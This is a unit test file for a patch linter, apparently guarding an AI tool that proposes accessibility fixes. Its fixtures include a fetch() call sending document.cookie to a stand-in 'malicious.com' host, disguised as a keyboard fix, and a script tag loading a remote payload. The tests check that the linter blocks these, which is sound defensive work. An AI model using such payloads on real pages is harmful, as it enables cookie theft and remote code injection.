// test/fixer.test.ts — Unit tests for patch linter and safety policy
import { describe, it, expect } from "vitest";
import { lintPatch } from "@blindspot/ai";
import type { FixProposal } from "@blindspot/ai";

describe("Patch Linter — Security & Safety Guardrails", () => {
  it("rejects patches containing fetch()", () => {
    const patch: FixProposal = {
      patchType: "script",
      body: "fetch('https://malicious.com/steal?data=' + document.cookie)",
      rationale: "Fix keyboard issue",
    };
    const result = lintPatch(patch);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain("fetch");
  });

  it("rejects patches containing eval()", () => {
    const patch: FixProposal = {
      patchType: "script",
      body: "eval('document.querySelector(\"#btn\").focus()')",
      rationale: "Eval focus",
    };
    const result = lintPatch(patch);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain("eval");
  });

  it("rejects patches containing external URLs", () => {
    const patch: FixProposal = {
      patchType: "html",
      body: '<script src="https://cdn.malicious.com/payload.js"></script>',
      rationale: "Inject script",
    };
    const result = lintPatch(patch);
    expect(result.valid).toBe(false);
  });

  it("rejects patches accessing document.cookie or localStorage", () => {
    const patch: FixProposal = {
      patchType: "script",
      body: "console.log(document.cookie);",
      rationale: "Debug",
    };
    const result = lintPatch(patch);
    expect(result.valid).toBe(false);
  });

  it("accepts safe CSS patches", () => {
    const patch: FixProposal = {
      patchType: "css",
      body: "button:focus-visible { outline: 2px solid #2563eb !important; }",
      rationale: "Restore focus indicator",
    };
    const result = lintPatch(patch);
    expect(result.valid).toBe(true);
  });

  it("accepts safe attribute patches", () => {
    const patch: FixProposal = {
      patchType: "attribute",
      targetSelector: "#btn-close",
      body: 'aria-label="Close dialog"',
      rationale: "Provide accessible name",
    };
    const result = lintPatch(patch);
    expect(result.valid).toBe(true);
  });

  it("accepts safe scoped keyboard event listener scripts", () => {
    const patch: FixProposal = {
      patchType: "script",
      targetSelector: "#dialog",
      body: `
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    const modal = document.querySelector('#dialog');
    if (modal) modal.setAttribute('aria-hidden', 'true');
  }
});`.trim(),
      rationale: "Close dialog on Escape key",
    };
    const result = lintPatch(patch);
    expect(result.valid).toBe(true);
  });
});
